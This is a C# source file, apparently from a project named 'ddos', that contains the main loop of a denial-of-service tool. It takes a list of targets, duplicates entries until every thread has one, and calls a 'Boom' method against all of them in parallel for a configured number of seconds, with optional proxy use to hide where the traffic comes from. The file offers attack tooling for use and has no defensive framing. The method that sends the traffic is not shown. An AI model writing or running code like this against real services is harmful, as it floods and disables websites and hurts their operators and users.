using ddos.Interfaces;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ddos.App
{
    public class NukeApp : IApp
    {
        private readonly IConfiguration _configuration;
        private readonly IServiceProvider _serviceProvider;
        private readonly ILogger _logger;
        private readonly ITargetsService _targetsService;
        private readonly INuke _nuke;
        private readonly IAppArgs _appArgs;
        public NukeApp(ILogger<NukeApp> logger,
                       IConfiguration configuration,
                       IServiceProvider serviceProvider,   
                       IAppArgs appArgs,
                       INuke nuke,
                       ITargetsService targetsService)            
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
            _configuration = configuration ?? throw new ArgumentNullException(nameof(configuration));
            _serviceProvider = serviceProvider ?? throw new ArgumentNullException(nameof(serviceProvider));
            _targetsService = targetsService ?? throw new ArgumentNullException(nameof(targetsService));    
            _nuke = nuke ?? throw new ArgumentNullException(nameof(nuke));
            _appArgs= appArgs ?? throw new ArgumentNullException(nameof(appArgs));
        }

        public IConfiguration Configuration => _configuration;

        public IServiceProvider ServiceProvider => _serviceProvider;

        public async Task<ExitCode> Run(CancellationToken cancellationToken)
        {           
            var targets = new List<string>(_targetsService.GetTargets());

            _logger.LogInformation($"targets: {targets.Count()}, useProxy: {_appArgs.UseProxy}, time: {_appArgs.SecondsToRun}, threads: {_appArgs.Threads}");

            if (!targets.Any())
            {
                _logger.LogWarning("Empty target list.");
                return ExitCode.Fail;
            }

            while (targets.Count() < _appArgs.Threads)
            {                
                var m = _appArgs.Threads - targets.Count();
                targets.AddRange(targets.Take(m > targets.Count() ? m : targets.Count()));

                _logger.LogTrace($"count: {targets.Count()}");
            };

            var sw = new Stopwatch();
            sw.Start();

            while (sw.Elapsed < TimeSpan.FromSeconds(_appArgs.SecondsToRun))
            {
                try
                {
                    await Task.Run(() =>
                    {
                        Parallel.ForEach(targets,
                                         new ParallelOptions() { CancellationToken = cancellationToken, MaxDegreeOfParallelism = _appArgs.Threads },
                                         async dest => await _nuke.Boom(dest, _appArgs.UseProxy, cancellationToken)
                                         );
                    });
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex.Message, ex);
                }
            }

            _logger.LogInformation("Finished.");

            return ExitCode.Success;
        }
        
    }
}
